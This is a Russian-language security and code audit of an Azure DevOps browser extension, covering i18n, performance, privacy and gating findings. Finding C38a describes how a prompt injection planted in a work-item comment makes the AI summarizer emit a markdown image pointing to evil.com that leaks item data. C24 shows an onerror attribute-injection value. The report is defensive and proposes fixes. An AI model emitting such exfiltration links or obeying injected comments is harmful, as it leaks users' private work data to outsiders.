**severity:** medium · **категория:** i18n · **статус:** `CONFIRMED`

**Файлы:** `src/app/setup.js`, `src/app/command-palette.js`, `src/components/tutorial-manager.js`, `src/components/i18n.js`, `docs/ARCHITECTURE.md`

**Доказательство**

> setup.js:51 `$('setup-load-hint').innerHTML=SETUP_HINT` затирает локализованный data-i18n-html захардкоженным EN (:107); ошибки setup EN ('Organization is required.' :225). command-palette.js:14-25 все PALETTE_ACTIONS EN; tutorial-manager.js:131 'Welcome to ADO Atlas!', :414 'Finish'/'Next'. i18n.js:17 `const RTL_LANGS=new Set(/* populate when RTL locales added */)` пустой; :75 всегда даёт dir=ltr; вёрстка физическая (views.css:9 `left:1.077rem`, tutorial-manager позиционирует по getBoundingClientRect().left). ARCHITECTURE §10 подаёт RTL как реализованную фичу.

**Что это значит**

Для ru/de/es первый экран (setup — гейт всего приложения), Ctrl+K палитра и обвязка туров показываются по-английски. RTL не протестирован ни на одной локали — при добавлении ar/he раскладка поедет. Документация переоценивает готовность.

**Рекомендация**

Правило: любой innerHTML/textContent из JS через window.i18n.t(); ключи palette/tutorial добавить в src/locales/*.json. RTL честно пометить как не поддерживаемый в §10 либо перейти на логические свойства (inset-inline-start) и dir-aware хелпер.

### C32 · Нет семантического слоя токенов: state-цвета повторяются литералами

**severity:** low · **категория:** ux · **статус:** `REFUTED → переформулирована`

**Файлы:** `src/styles/base.css`, `src/styles/views.css`, `src/styles/premium.css`

**Доказательство**

> ИСХОДНАЯ НАХОДКА ОПРОВЕРГНУТА. Заявлялось «247 захардкоженных hex ломают светлую тему». Цифра воспроизводится, интерпретация — нет. Разбор: 22 «хардкода» в base.css — это и есть определения токенов (11 dark + 11 light); ~50 — `var(--panel,#1e1e1e)`-подобные fallback'и, которые никогда не срабатывают (отсюда мнимые «#333×15»); ~45 из 51 `#fff` — `color:#fff` поверх залитого фона (корректно в обеих темах); ~75 — брендовые (золото, AI-фиолетовый) и state-цвета (#e74c3c, #2da44e, #ffb703), которые ПО ОПРЕДЕЛЕНИЮ не должны меняться с темой. Поверхности/текст/границы идут через токены (side-panel 103 × var(), filter-builder 111, views 73). Единственный настоящий тема-зависимый хардкод — views.css:154-155 (#171c23 в repeating-linear-gradient), и для него УЖЕ написан оверрайд views.css:161-168. «@media prefers-color-scheme: 0» — не дефект: тема JS-driven через body.light (theme-init.js:7 читает matchMedia), потому что нужны три режима (dark/light/auto), а чистым @media это не выражается.

**Что это значит**

Светлая тема НЕ сломана, техдолг не растёт линейно. Остаётся мелкое: нет семантического слоя токенов — state-цвета повторяются литералами (#e06c75×9, #e74c3c×7, #2da44e×5, #ffb703×6), поэтому смена, например, error-red требует правки в 5+ файлах.

**Рекомендация**

Добавить `--danger` / `--success` / `--warn` / `--brand-gold` / `--brand-ai` в base.css и заменить литералы по мере касания файлов. Отдельно (аудитом не проверялось) — проверить контраст #ffb703 и #3fb950 как цвета ТЕКСТА на светлом фоне по WCAG.

### C33 · Дублирование разметки card-picker: 12 почти одинаковых .ppick-блоков с параллельными ID
**severity:** medium · **категория:** dx · **статус:** `CONFIRMED`

**Файлы:** `index.html`, `src/components/card-picker.js`

**Доказательство**

> index.html — блок пикера (.ppick+.psearch+.presults) продублирован 12 раз: bulk_assigned_pick(:169), bulk_iter_pick(:180), bulk_parent_pick(:191), s_assigned_pick(:288), s_iter_pick(:299), s_parent_pick(:311), s_deps_*(:326,:338), c_assigned_pick(:380), n_*(:411,:420,:429). Инлайновые стили/z-index расходятся (у bulk-* z-index:9000, у side/new — без).

**Что это значит**

Любая правка UX пикера (a11y-атрибуты, поведение, стиль) требует 12 синхронных изменений — источник дрейфа (bulk-пикеры уже отличаются от side/new) и умножает работу по добавлению ARIA.

**Рекомендация**

Логика уже общая в card-picker.js — вынести и разметку: генерировать .ppick из JS-шаблона по id-префиксу либо один <template>, клонируемый при инициализации.

### C35 · Рудиментарный класс pro-glow в разметке кнопок экспорта

**severity:** low · **категория:** dx · **статус:** `REFUTED → переформулирована`

**Файлы:** `index.html`, `src/components/pro-button-manager.js`

**Доказательство**

> ИСХОДНАЯ НАХОДКА ОПРОВЕРГНУТА. Заявлялось «два источника истины о тарифе». Факты верны (index.html:53-54 хардкодит `pro-glow`, а TIERS.export==='preview'), но вывод — нет. `ProButtonManager.apply()` отрабатывает БЕЗУСЛОВНО: boot.js:15 → wirePremiumPlaceholders() вызывается на каждом DOMContentLoaded до проверки авторизации → init.js:294 → ProButtonManager.init() → apply() на каждом [data-pro-feature], снимая обе метки (pro-button-manager.js:69-70). Мелькания тоже нет: кнопки лежат в `#exportpanel` с `style="display:none"` (index.html:50) и невидимы до клика. Дефолт `getTier(): return TIERS[feature]||'pro'` — не баг, а fail-closed: забытая фича становится ПЛАТНОЙ, а не бесплатной. TIERS — единственный runtime-источник истины (управляет и классом, и бейджем, и энтайтлментом через isPreview()).

**Что это значит**

Пользовательского эффекта нет. Остаётся только то, что разметка вводит в заблуждение при чтении кода.

**Рекомендация**

Убрать `pro-glow` из `index.html:53-54` (две кнопки экспорта), чтобы markup не противоречил TIERS. Дефолт `getTier() → 'pro'` НЕ менять — это корректное направление отказа.

### C36 · Стратегия многопроходности не учитывает облачную стоимость

**severity:** medium · **категория:** performance · **статус:** `CONFIRMED`

**Файлы:** `src/ai/ai-search-service.js`, `src/ai/ai-summarizer.js`, `src/ai/ai-provider.js`

**Доказательство**

> ПОДТВЕРЖДЕНО, цифра уточнена. Thorough-пайплайн (ai-search-service.js:360-526) даёт 4-7 billed-вызовов (типично 5-6): field-select + до 3 семантических матчеров (_matchTags/_matchAssignees/_matchDates :1179/:1227/:1278) + enrich + compile + 0-1 repair. Отдельной ветки для cloud/BYOK НЕТ — все стадии идут через один и тот же provider. Бюджета токенов нет нигде; единственное усечение — `maxAllowedValuesLimit=10` (ai-provider.js:12). УСИЛЕНИЕ: проверка hasLogicKeywords (determineReasoningLevel :184) стоит ПЕРВОЙ, до дешёвых веток fast/balanced — проверено на строках: 'no bugs', 'не закрытые', 'o', 'bug!' → все дают thorough. Уровень 'auto' — дефолт и залипает в localStorage. ai-summarizer.js:202-222 грузит ВСЕ комментарии без пагинации и лимита + полные desc/AC в один вызов.

**Что это значит**

Пайплайн проектировался под бесплатную on-device Nano, но тот же multi-call прогон идёт на платный BYOK-ключ пользователя. Любой запрос с токеном 'не'/'no'/'or' или символом `!`/`|`/`(` минует дешёвые ветки БЕЗУСЛОВНО, независимо от длины — даже запрос из двух слов уходит в 7-проходный пайплайн. Item с сотнями комментариев пробивает контекст или дорого стоит. Для hosted-провайдера риск частично снят серверными per-license лимитами; для BYOK — не снят ничем.

**Рекомендация**

Провайдеро-зависимая стратегия: для облака схлопывать пайплайн в 1-2 вызова и по умолчанию использовать fast независимо от 'auto'. Усечь описание и число комментариев (последние N / бюджет символов). Сузить логические триггеры (убрать односимвольные и короткие 'o'/'no'/'не'), перенести проверку ПОСЛЕ дешёвых веток. Показывать примерную стоимость BYOK.

### C37 · Мёртвый fallback в custom-cloud + три расходящиеся копии extractJSON

**severity:** medium · **категория:** architecture · **статус:** `CONFIRMED (атрибуция исправлена)`

**Файлы:** `src/ai/custom-cloud-provider.js`, `src/ai/chrome-prompt-provider.js`, `src/ai/ai-search-service.js`

**Доказательство**

> ПОДТВЕРЖДЕНО. Верификатор целенаправленно искал безобидное объяснение catch-блока (что в try парсится сырой ответ, а в catch — извлечённый) и НЕ нашёл. custom-cloud-provider.js:104-115 дословно: `try { const extracted = this.extractJSON(raw); return JSON.parse(extracted); } catch (e) { console.warn(...); return JSON.parse(this.extractJSON(raw)); }` — extractJSON чистая функция от raw (:117-132), raw не переопределяется → повтор детерминированно бросит то же исключение. Комментарий `// Fallback or repair` описывает намерение, которого в коде нет. Для сравнения chrome-prompt-provider.js:189-204 в своём catch делает НАСТОЯЩИЙ repair — формирует repairPrompt и заново дёргает модель. ИСПРАВЛЕНИЕ АТРИБУЦИИ: три реализации extractJSON есть и они расходятся, но выбор зависит от РЕЖИМА ПАЙПЛАЙНА, а не от провайдера: fast → provider.promptJSON (упрощённый парсер, в т.ч. для on-device Chrome!), balanced/thorough → provider.prompt + сервисный робастный (для всех, включая облачные).

**Что это значит**

В custom-cloud восстановления после невалидного JSON нет вообще — только вводящий в заблуждение console.warn. Правки робастного парсера не доходят до упрощённых копий.

**Рекомендация**

Вынести один общий `AdoLib.extractJSON` (взять робастную версию из ai-search-service.js:531) и переиспользовать во всех трёх местах — функция чистая, сразу покрывается тестами. В custom-cloud `promptJSON` сделать настоящий repair-проход (как у Chrome-провайдера) либо пробросить осмысленную ошибку.

### C38a · Prompt injection + канал утечки данных через markdown-картинку (img-src не ограничен в CSP)

**severity:** high · **категория:** security · **статус:** `CONFIRMED · ЭСКАЛИРОВАНА`

**Файлы:** `src/ai/ai-summarizer.js`, `src/ai/ai-search-service.js`, `src/ai/prompts/search-prompt.js`, `src/core/lib.js`, `manifest.json`

**Доказательство**

> НАЙДЕНО ПРИ ВЕРИФИКАЦИИ — этого не было в исходной находке. Проверено мной лично. Цепочка: (1) экранирования нет — ai-summarizer.js:240-250 склеивает в промпт сырьём title/desc/AC и текст ВСЕХ комментариев (`[Comment by ${author}]: ${cleanText}`), делимитеры — обычные текстовые псевдо-теги `<system>`/`<rules>` (search-prompt.js:4,46), их тривиально закрыть из комментария; (2) вывод модели рендерится через `contentEl.innerHTML = mdToHtml(res)` (ai-summarizer.js:257) БЕЗ опций; (3) `mdToHtml` по умолчанию разрешает картинки — `const allowImg = opts.allowImages !== false` (lib.js:210), и НИГДЕ в src/ не передаётся allowImages:false; (4) CSP в manifest.json:21 содержит script-src, object-src, connect-src — но НИ default-src, НИ img-src. Проверено: загрузка картинок не ограничена ничем.

**Что это значит**

ЭТО КАНАЛ УТЕЧКИ, а не только «искажённое summary». Любой участник ADO-организации оставляет в комментарии инъекцию → пользователь жмёт Summarize → все комментарии уходят в промпт сырьём → модель выдаёт `![](https://evil.com/?d=<содержимое>)` → рендерится в `<img>` → браузер загружает → данные work item утекают на чужой хост. Строгий `connect-src` при этом обходится ПОЛНОСТЬЮ, потому что утечка идёт через img, а не через fetch. XSS нет, но exfiltration есть.

**Рекомендация**

Три независимых барьера, ставить все: (1) `mdToHtml(res, { allowImages: false })` для AI-вывода — одна строка, закрывает вектор немедленно; (2) добавить `img-src` (и `default-src`) в CSP манифеста; (3) экранировать `<`/`>` во всех значениях, приходящих из work items, и обернуть данные в границы со случайным nonce, инструктировав модель трактовать блок как данные.


### C38b · Контент work items уходит в облако без предупреждения; PRIVACY.md это отрицает

**severity:** medium · **категория:** compliance · **статус:** `CONFIRMED`

**Файлы:** `src/ai/ai-summarizer.js`, `src/ai/ai-text-editor.js`, `content/PRIVACY.md`, `src/locales/en.json`

**Доказательство**

> Вторая половина расщеплённой находки C38. Предупреждение об отправке в облако СУЩЕСТВУЕТ, но только в диалоге AI-поиска: ai-search-dialog.js:1239-1243 ставит `ai.helpTooltip.cloud`, и его текст (src/locales/en.json:32) прямо ограничен формулировкой «...will be sent to the configured provider API **to compile the search filters**». Ни `ai-summarizer.js`, ни `ai-text-editor.js` (кнопка index.html:256, popover-действия ai-text-editor.js:56-68) не показывают НИКАКОГО предупреждения — а именно они отправляют наружу полный текст описания, acceptance criteria и ВСЕХ комментариев. Отдельно: `content/PRIVACY.md` вообще не упоминает AI/Gemini/OpenAI (grep → 0 совпадений) и утверждает «no third-party servers … No data is ever transmitted» (строки 46-48).

**Что это значит**

Пользователь, подключивший облачный AI ради поиска, не знает, что кнопка Summarize отправляет тому же провайдеру всё содержимое задачи вместе с перепиской в комментариях. Для корпоративного пользователя (а это ядро аудитории) это может быть прямым нарушением внутренней политики. `PRIVACY.md`, отрицающий передачу данных третьим сторонам, при живом облачном провайдере — это ещё и риск при ревью Chrome Web Store и потенциальная претензия по GDPR.

**Рекомендация**

Показывать предупреждение на ВСЕХ путях, отправляющих данные наружу (summarize, text-editor), а не только в поиске — одноразовый диалог с явным согласием при первом использовании облачного провайдера. Переписать `PRIVACY.md`: честно описать, что при подключении BYO-ключа контент work items уходит выбранному провайдеру, а on-device Gemini Nano данные не передаёт. Это же требование из [03-spec-security.md § S8](03-spec-security.md).

### C39 · getAvailability='downloadable' → getActive() возвращает ненастроенный провайдер

**severity:** low · **категория:** dx · **статус:** `CONFIRMED`

**Файлы:** `src/ai/custom-cloud-provider.js`, `src/ai/ai-provider.js`, `src/ai/ai-summarizer.js`, `src/ai/ai-text-editor.js`

**Доказательство**

> ПОДТВЕРЖДЕНО по всей цепочке, severity понижена. (1) custom-cloud-provider.js:83-89 — `if (isEnabled && apiKey) return 'available'; return 'downloadable'; // means needs configuration`; (2) ai-provider.js:235-262 getActive() берёт первого с `avail !== 'unsupported'`, а isSupported() у custom всегда true (:79-81) → ненастроенный проходит фильтр; (3) миграция создаёт custom-cloud-gemini/openai с `isEnabled: true` и пустым apiKey (ai-provider.js:188-208) — ключевое звено подтверждено; (4) ai-summarizer.js:161-170 и ai-text-editor.js:34-43 имеют дружелюбную ветку `if (!ai)`, но она НЕДОСТИЖИМА, т.к. getActive() вернул провайдера → ensureReady() бросает сырое `API key is not configured for Custom Cloud AI provider`.

**Что это значит**

На устройстве без Nano пользователь вместо подсказки «настройте провайдера» видит сырое английское сообщение внутри локализованной обёртки «Failed to generate summary: {error}». СМЯГЧАЮЩИЕ ФАКТЫ (поэтому low, а не medium): краша нет — исключение ловится (ai-summarizer.js:258-266, ai-text-editor.js:77-84); AI Search обрабатывает 'downloadable' корректно (init.js:58 ставит title «Configure API Key and search»). Деградация ограничена summarize/text-editor и сводится к некачественному тексту ошибки + мёртвой ветке noProvider.

**Рекомендация**

Ввести отдельный статус `'needs-configuration'` (либо проверять apiKey в getActive перед возвратом), чтобы неполный провайдер не становился активным. В summarizer/editor показывать локализованную подсказку с кнопкой «Configure AI…».

### C24 · Неэкранированный src кастомных эмодзи в innerHTML (+ хрупкость самописного экранирования)
**severity:** low · **категория:** security · **статус:** `CORRECTED`

**Файлы:** `src/core/lib.js`, `src/core/api/http-auth.js`, `src/core/api/items.js`, `src/app/activity.js`

**Доказательство**

> ПОПРАВКА АУДИТОРА. Исходная находка заявляла stored XSS через regex-конвертеры HTML↔Markdown. Проверено вручную: lib.js:207 mdToHtml сначала экранирует (`const h=s=>s.replace(/[&<>"']/g,...)`, применяется к тексту ПЕРВЫМ), и только затем накладывает markdown-регулярки; LINK_RE требует `https?://` — `javascript:` не проходит. Эксплуатируемой XSS в конвертере НЕ найдено. Реальным остаётся: activity.js:38-43 renderEmojiMarkup `return \`<img class="emoji-img" src="${emojiVal}" alt="${type}">\`` — вставляется в innerHTML без htmlEsc; значение вида `icons/x" onerror="...` проходит проверку isUrl.

**Что это значит**

Self-XSS: пользователь должен сам вписать вредоносный URL в свой преф кастомных эмодзи — вред только себе. Severity понижена с medium до low. Остаётся системная ХРУПКОСТЬ: 244 использования innerHTML в src/, а инвариант безопасности держится на самописном escape-then-transform и дисциплине разработчика — один промах даст настоящий stored XSS, потому что контент work items пишут ДРУГИЕ участники ADO-организации.

**Рекомендация**

Срочно и дёшево: `src="${htmlEsc(emojiVal)}"`, не-URL ветку рендерить через textContent. Защита в глубину (не срочно): прогонять итоговый HTML mdToHtml через DOMPurify (вендорить одним файлом) перед innerHTML; зафиксировать инвариант fuzz-тестом на mdToHtml.

### C40 · Дрейф ARCHITECTURE.md относительно кода

**severity:** low · **категория:** architecture · **статус:** `CONFIRMED`

**Файлы:** `docs/ARCHITECTURE.md`, `index.html`, `tools/check-globals.js`

**Доказательство**

> ПОДТВЕРЖДЕНО, плюс найден третий пункт дрейфа. (1) ARCHITECTURE.md:96-98 описывает `namespace → const → loading → badges → state-globals → undo → …`, реальный index.html:732-741: `namespace → analytics → const → loading → badges → state-globals → prefs → backend → undo` — три файла (analytics.js:733, prefs.js:738, backend.js:739) в доке НЕ упомянуты вообще. Остальная цепочка совпадает. (2) ARCHITECTURE.md:112-113 требует «Every new src/**/*.js must be added to tools/check-globals.js AND index.html» — неверно в части check-globals: tools/check-globals.js:12-27 делает `getJsFilesRecursively(path.join(root,"src"))`, рекурсивный обход, ручного списка нет. (3) БОНУС: ARCHITECTURE.md:113-114 ссылается на `build.ps1`, которого в репо НЕТ — реальный билд это tools/build.js (package.json:12).

**Что это значит**

Разработчик по инструкции делает лишнюю работу (добавляет файл в check-globals, где это не нужно) и может неверно восстановить порядок загрузки. Подрывает доверие к остальным утверждениям доки — а она в остальном хорошая и ей верят.

**Рекомендация**

Синхронизировать §Load order с index.html (включить analytics/prefs/backend), исправить фразу про check-globals, заменить build.ps1 на tools/build.js. Идеально — генерировать раздел Load order скриптом из index.html, чтобы он не мог разойтись.

### C41 · Литерал 'me' уходит в System.AssignedTo — и в UI-слое, и в api-слое

**severity:** low · **категория:** correctness · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/items.js`, `src/core/api/endpoints.js`, `src/app.js`, `src/app/editor.js`, `src/app/bulk.js`

**Доказательство**

> ПОДТВЕРЖДЕНО, и дефект оказался ШИРЕ заявленного. (1) endpoints.js:5-14 me() глотает любую ошибку → `""`. (2) items.js:260-263 `if(fields.assigned==="me"){const u=await me(); if(u)fields.assigned=u;}` — при u==="" литерал остаётся; items.js:464 `""||"me"`==="me". resolveField('assigned') → System.AssignedTo (identity-поле, core.js:101) — 'me' реально уходит в ops. (3) ГЛАВНОЕ: защиты в UI НЕТ — там ТОТ ЖЕ дефект. app.js:500, editor.js:398, item-create.js:46 — `assigned==='me' ? (currentUser||assigned) : assigned`; bulk.js:240 — `val = currentUser || 'me'`; кнопки «assign to me» init.js:728/857/865 — `assignedEditor.set(currentUser||'me')`. При пустом currentUser UI САМ подставляет строку 'me'. (4) currentUser заполняется из того же api.me() (init.js:244) — обе линии защиты деградируют одновременно.

**Что это значит**

При недоступном connectionData (сеть, узкий scope PAT) «Assign to me» отправляет в ADO строку 'me' как identity → ошибка резолва → невнятный сбой сохранения вместо назначения. Порчи данных нет (ADO отклоняет запрос), страдает понятность ошибки — поэтому low.

**Рекомендация**

Фолбэк `currentUser || 'me'` — это не защита, а второй экземпляр той же ошибки. Убрать его из ОБОИХ слоёв: при недоступном currentUser падать с понятным «не удалось определить вас — повторите», а не отправлять литерал.

### C42 · Нет CHANGELOG; мёртвый scratch/test.js

**severity:** low · **категория:** dx · **статус:** `CONFIRMED (косметика)`

**Файлы:** `package.json`, `README.md`, `scratch/test.js`

**Доказательство**

> ПОДТВЕРЖДЕНО, но вред нулевой. (а) CHANGELOG.md отсутствует, в README нет секции истории версий (grep по changelog / version history → пусто), при этом package.json:3 "version":"1.3.0" синхронизирован с manifest. (б) scratch/test.js:1 `require('../lib.js')` — корневого lib.js нет (переехал в src/core/lib.js), скрипт падает с MODULE_NOT_FOUND. (в) ВАЖНО для оценки: scratch/ в .gitignore:5, в билд НЕ попадает (tools/build.js:12-13 упаковывает явный список файлов + vendor/icons/_locales/src) и не сканируется check-globals.

**Что это значит**

Отсутствие CHANGELOG — валидный DX-нит: что уехало в каждую версию Web Store, не зафиксировано нигде, откаты и ответ на «в какой версии починили?» становятся угадайкой. scratch/test.js — чистая косметика: не влияет ни на артефакт, ни на CI, только локальная путаница.

**Рекомендация**

Завести CHANGELOG.md (Keep a Changelog), черновик генерировать из conventional-commits — они в проекте уже соблюдаются. Удалить scratch/test.js и convert_css.js либо починить путь.


### C44 · Нет единого рубильника стадии премиума (6 файлов) + нулевое покрытие гейтинга тестами

**severity:** low · **категория:** testing · **статус:** `CONFIRMED`

**Файлы:** `src/ai/hosted-cloud-provider.js`, `background.js`, `src/components/entitlement-manager.js`, `src/components/premium-paywall.js`, `src/components/pro-features.js`, `src/app/init.js`

**Доказательство**

> ПОДТВЕРЖДЕНО, файлов оказалось 6, а не «≥5». (1) hosted-cloud-provider.js:13 `const BACKEND_LIVE=false` + три throw «Cloud AI is coming soon» (:33,:43,:48); (2) background.js:205-208 fetchHostedAI → «Hosted AI proxy is not available yet»; (3) background.js:130,139 — STUB ежедневной валидации лицензии, `TODO(Stage 2)`; (4) entitlement-manager.js:60-64 activate() throws, :67-70 validate() — no-op `return this.isPro()`; (5) premium-paywall.js:132-136 блок pw-coming-soon + :14 TODO про Lemon Squeezy URL; (6) pro-features.js:23-71 каталог со `status:'stub'` + init.js:279-287. Тесты: grep по `entitlement|isPro|paywall|grace|gating` в tests/ → 0 совпадений.

**Что это значит**

Переход в Stage 2 потребует синхронно править ШЕСТЬ файлов и надеяться на ручной smoke. Забыл один — несогласованное состояние (касса включилась, провайдер рапортует «недоступно»). Не покрыта тестами и логика grace-периода (entitlement-manager.js:23,45-53) — единственная защита платящего пользователя от даунгрейда при офлайне.

**Рекомендация**

Один конфиг-флаг `PREMIUM_STAGE`, от которого зависят все шесть точек. Юнит-тест на EntitlementManager.isPro: free / active / past_due+grace / expired / devForce — быстро, без Chrome. Поднять до medium, если релиз премиума близко.

### C45 · Тумблер Deep Research обходит EntitlementManager.gate() — неконсистентный гейтинг

**severity:** low · **категория:** monetization · **статус:** `CONFIRMED (корень глубже)`

**Файлы:** `src/components/ai-search-dialog.js`, `src/components/entitlement-manager.js`

**Доказательство**

> ПОДТВЕРЖДЕНО, и корень оказался глубже, чем «непоследовательный UX». Две точки входа в ОДНОМ файле ведут в РАЗНЫЕ компоненты (не алиасы): ai-search-dialog.js:198-201 (тумблер Deep Research) → `ProFeaturesPanel.open()` — сигнатура БЕЗ аргументов (pro-features.js:189), открывает общий каталог всех Pro-фич; ai-search-dialog.js:1136 (вкладка Cloud AI) → `PremiumPaywall.open('cloud_ai')` — сигнатура open(feature, info) (premium-paywall.js:193), точечный питч. ГЛАВНОЕ: канонический путь гейтинга — `EntitlementManager.gate(feature)` (:89-95), который сам зовёт PremiumPaywall.open(feature) И предварительно проверяет ProButtonManager.isPreview(). Код на :198-201 обходит gate() вручную.

**Что это значит**

Два следствия. (1) Пользователь, ткнувший КОНКРЕТНУЮ фичу, получает общий список из 40 пунктов вместо целевого предложения — слабее конверсия. (2) Обход gate() ИГНОРИРУЕТ Free Preview: если Deep Research пометят как preview, тумблер всё равно останется заблокированным. Это частный случай общей проблемы C14 (gate() не вызывается нигде).

**Рекомендация**

Заменить ai-search-dialog.js:198-201 на `if (!window.EntitlementManager?.gate('deep_research')) { deepResearchToggle.checked = false; return; }`. Завести ключ deep_research в FEATURES/TIERS. ProFeaturesPanel оставить только для кнопки «Explore Pro».

---

## Опровергнутые находки

Скептики проверили и отбили. Оставлены здесь, чтобы к ним не возвращались.

- **C43 · Туры вешают capture-phase click-listener на document** — формально слушатель не снимается (tutorial-manager.js:106-108), но стоимость околонулевая: в реестре 5 туров, `checkAvailableTutorials()` имеет ранний guard (:270), а `querySelector`/`getBoundingClientRect` вызываются ТОЛЬКО для непросмотренных туров. В устоявшемся состоянии на клик приходится один отложенный `querySelector` и 5 property-lookup, вне синхронного обработчика. Утверждение «сканирование с forced reflow на каждый клик» фактически неверно.

Скептики проверили и отбили. Оставлены здесь, чтобы к ним не возвращались.

- **C01 · Разрозненное изменяемое состояние в общем скоупе и ручной выборочный сброс при ре-буте**
  <br>Почему отбито: Цитата init.js:95 верна, но конкретный impact опровергнут. currentUser решён выше по стеку: setup.js:241 выставляет currentUser/projectName ДО initialBoot(true) при смене проекта, плюс loadIdentity() init.js:100/244. treeEverLoaded (app.js:42) — session-флаг для firstLoad-авторазворота (app.js:397);

- **C13 · Нет пути оплаты/активации — форма активации из пейволла удалена, кнопка покупки мертва**
  <br>Почему отбито: Факты цитат верны, но impact раздут. Это осознанный задокументированный трейд-офф Stage 1. premium-paywall.js:11-14 прямо помечает код как "STUB (Stage 1)" и BUY_URL как "TODO(Stage 2): Lemon Squeezy checkout". Строки 132-137: форма не "удалена случайно", а заменена баннером "Pro Features — Coming S

- **C14 · Публичный API EntitlementManager не подключён: gate() без вызовов, Free-Preview не работает, нет live-обновления UI** ⚠️ **Опровержение было ошибочным — находка восстановлена как C14, см. выше.**
  <br>Почему отбито: Все цитаты подтверждены. init.js:282-288 — делегированный хендлер зовёт PremiumPaywall.open(feature) для любого [data-pro-feature] без проверки tier/preview. gate() (entitlement-manager.js:90) не вызывается нигде (grep: только определение+внутренний isPro), ветка isPreview 92-93 — мёртвый код. onCha

- **C19 · Мульти-вендорная абстракция (capabilities, native-id) задокументирована как готовая, в коде — заглушка**
  <br>Почему отбито: Цитаты кода верны: backend.js:72 capabilities захардкожены true; graph.js:37/69, time.js:53 map(Number); filter-compiler.js:498 throw кроме WIQL; UI api.capabilities не читает (хит chrome-prompt-provider.js:32 — Chrome AI, не backend). НО тезис «задокументирована как готовая» ложен: заголовок backen

- **C34 · Валидация лицензии — заглушка: expires_at не проверяется, grace не работает, анти-лик §8 только в доке**
  <br>Почему отбито: Цитаты точны: isPro() (entitlement-manager.js:47-54) не проверяет expires_at; validateLicenseBackground() (background.js) — no-op с TODO(Stage 2), last_validated_at не пишется; GRACE_DAYS=7 (:16); §8 ARCHITECTURE.md:181-185 описывает 3 устройства/binding, в коде только ensureInstallationId. Но всё э
